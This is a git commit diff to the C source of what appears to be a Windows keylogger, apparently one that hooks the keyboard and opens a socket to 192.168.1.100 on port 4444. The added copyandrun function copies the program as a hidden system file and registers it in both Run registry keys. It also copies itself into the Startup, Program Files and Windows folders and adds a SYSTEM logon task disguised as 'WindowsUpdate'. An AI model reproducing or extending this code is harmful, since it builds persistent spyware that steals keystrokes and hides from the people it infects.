28f24243c3067d888e3aea33a96f8bda6ebe80a0
MorphyKutay <kutaynevzat2006@gmail.com>
2025-05-09 22:23:20 +0300

    Auto-start mechanisms expanded

--- main.c
+++ main.c
@@ -2,6 +2,7 @@
 #include <windows.h>
 #include <stdbool.h>
 #include <winsock2.h>
+#include <shlobj.h> 
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -9,6 +10,89 @@ HHOOK hook;
 LPMSG msg;
 bool runThread = true;
 SOCKET sock;
+
+
+bool copyandrun(const char* exe_name){
+    char appdata_path[MAX_PATH];
+    if(SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata_path))) {
+        char dest_path[MAX_PATH];
+        snprintf(dest_path, MAX_PATH, "%s\\%s", appdata_path, exe_name);
+
+        char current_path[MAX_PATH];
+        if(GetModuleFileName(NULL, current_path, MAX_PATH) == 0) {
+            printf("Mevcut dosya yolu alınamadı\n");
+            return false;
+        }
+
+        // If the target file already exists, delete it first
+        if(GetFileAttributes(dest_path) != INVALID_FILE_ATTRIBUTES) {
+            DeleteFile(dest_path);
+        }
+
+        // Try file copying
+        if(CopyFile(current_path, dest_path, FALSE) == 0) {
+            DWORD error = GetLastError();
+            printf("Dosya kopyalama hatası: %ld\n", error);
+            return false;
+        }
+
+        // Set file permissions - mark as both hidden and system file
+        SetFileAttributes(dest_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+        
+        // Write to Registry - HKEY_CURRENT_USER
+        HKEY hKey;
+        const char* reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+        LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, reg_path, 0, KEY_SET_VALUE, &hKey);
+        if(result == ERROR_SUCCESS) {
+            RegDeleteValue(hKey, exe_name);
+            result = RegSetValueEx(hKey, exe_name, 0, REG_SZ, (const BYTE*)dest_path, strlen(dest_path) + 1);
+            RegCloseKey(hKey);
+        }
+
+        // Write to Registry - HKEY_LOCAL_MACHINE
+        result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, reg_path, 0, KEY_SET_VALUE, &hKey);
+        if(result == ERROR_SUCCESS) {
+            RegDeleteValue(hKey, exe_name);
+            result = RegSetValueEx(hKey, exe_name, 0, REG_SZ, (const BYTE*)dest_path, strlen(dest_path) + 1);
+            RegCloseKey(hKey);
+        }
+
+        // Copy to start folder
+        char startup_path[MAX_PATH];
+        if(SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
+            char startup_dest[MAX_PATH];
+            snprintf(startup_dest, MAX_PATH, "%s\\%s", startup_path, exe_name);
+            CopyFile(dest_path, startup_dest, FALSE);
+        }
+
+        // Copy to Program Files folder too
+        char program_files[MAX_PATH];
+        if(SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, 0, program_files))) {
+            char program_files_dest[MAX_PATH];
+            snprintf(program_files_dest, MAX_PATH, "%s\\%s", program_files, exe_name);
+            CopyFile(dest_path, program_files_dest, FALSE);
+        }
+
+        // Copy to Windows folder too
+        char windows_path[MAX_PATH];
+        GetWindowsDirectory(windows_path, MAX_PATH);
+        char windows_dest[MAX_PATH];
+        snprintf(windows_dest, MAX_PATH, "%s\\%s", windows_path, exe_name);
+        CopyFile(dest_path, windows_dest, FALSE);
+
+        // Add to Task Scheduler
+        char cmd[MAX_PATH * 2];
+        snprintf(cmd, sizeof(cmd), 
+            "schtasks /create /tn \"WindowsUpdate\" /tr \"%s\" /sc onlogon /ru SYSTEM /f", 
+            dest_path);
+        system(cmd);
+
+
+
+        return true;
+    }
+    return false;
+}
 
 LRESULT CALLBACK KeyboardProc(int code , WPARAM wParam, LPARAM lParam){
     if(code == HC_ACTION && wParam == WM_KEYDOWN){
@@ -67,6 +151,12 @@ bool initSocket(const char* ip,int port){
 
 
 int main(int argc,char* argv[]){
+ 
+    if(!copyandrun("hack.exe")){
+        printf("Failed to copy and run the executable\n");
+        return 1;
+    }
+
     MSG msg;
     const char* ip = "192.168.1.100";
     int port = 4444;
